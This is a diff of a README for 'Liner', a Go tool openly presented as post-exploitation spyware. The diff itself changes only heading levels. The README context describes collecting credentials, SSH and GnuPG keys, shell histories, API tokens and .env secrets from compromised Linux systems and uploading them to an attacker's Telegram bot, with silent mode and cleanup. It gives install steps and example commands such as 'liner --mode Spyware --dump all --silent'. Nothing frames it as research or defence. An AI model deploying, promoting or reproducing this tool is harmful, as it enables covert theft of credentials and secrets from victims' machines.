@@ -1,4 +1,4 @@
-# Liner - Post-Exploitation Data Exfiltration Tool via Telegram
+##  Liner - Post-Exploitation Data Exfiltration Tool via Telegram
 
 **Liner** is a lightweight post-exploitation utility designed for rapid data collection and exfiltration from compromised Linux systems.  
 It targets sensitive artifacts such as credentials, session tokens, private keys, and developer secrets, packaging and transferring them securely via Telegram bot API.
@@ -9,7 +9,7 @@ Built in Go, it supports silent operation, automated cleanup, and concurrent fil
 
 ---
 
-## 🔧 Features
+### 🔧 Features
 
 - Collects a wide range of sensitive files:
   - Stored credentials, shell histories, SSH keys, GnuPG data, API tokens, `.env` secrets, and more.
@@ -23,7 +23,7 @@ Built in Go, it supports silent operation, automated cleanup, and concurrent fil
 
 ---
 
-## 📦 Requirements
+### 📦 Requirements
 
 Install required packages:
 
@@ -38,7 +38,7 @@ Also required:
 
 ---
 
-## 🚀 Installation
+### 🚀 Installation
 
 ```bash
 git clone https://github.com/Nowafen/liner.git
@@ -59,7 +59,7 @@ liner --version
 
 ---
 
-## 🛠️ Usage
+### 🛠️ Usage
 
 Basic syntax:
 
@@ -67,7 +67,7 @@ Basic syntax:
 liner --mode Spyware --dump <TYPE> --token <TOKEN> --id <CHAT_ID> [options]
 ```
 
-### Required Flags
+#### Required Flags
 
 - `--mode Spyware` (only mode supported for now)
 - `--dump`:  
@@ -79,7 +79,7 @@ liner --mode Spyware --dump <TYPE> --token <TOKEN> --id <CHAT_ID> [options]
 - `--token`: Your Telegram bot token
 - `--id`: Telegram chat ID
 
-### Optional Flags
+#### Optional Flags
 
 - `--silent`: Suppress all output
 - `--version`: Show current version
@@ -88,7 +88,7 @@ liner --mode Spyware --dump <TYPE> --token <TOKEN> --id <CHAT_ID> [options]
 
 ---
 
-## 💡 Examples
+### 💡 Examples
 
 ```bash
 sudo liner --mode Spyware --dump Password --token <BOT_TOKEN> --id <CHAT_ID>
@@ -100,7 +100,7 @@ sudo liner --mode Spyware --dump all --token <BOT_TOKEN> --id <CHAT_ID> --silent
 
 ---
 
-## 🧠 How It Works
+### 🧠 How It Works
 
 1. **Environment Validation:**  
    Ensures the target system is Linux-based before proceeding.
@@ -123,7 +123,7 @@ sudo liner --mode Spyware --dump all --token <BOT_TOKEN> --id <CHAT_ID> --silent
 
 ---
 
-## ⚙️ Troubleshooting
+### ⚙️ Troubleshooting
 
 - **Upload fails with `429 Too Many Requests` or times out?**  
   Telegram may be throttling API requests. Try reducing the upload concurrency in `core/telegram.go` or increase delay between sends.
@@ -142,12 +142,12 @@ unzip liner_data.zip
 ```
 ---
 
-## 🤝 Contributing
+###### 🤝 Contributing
 
 Pull requests and issues are welcome. Let’s improve this project together.
 
 
-## 📜 License
+### 📜 License
 
 This project is **proprietary and closed-source**.  
 All rights reserved © 2025 [MNM]  
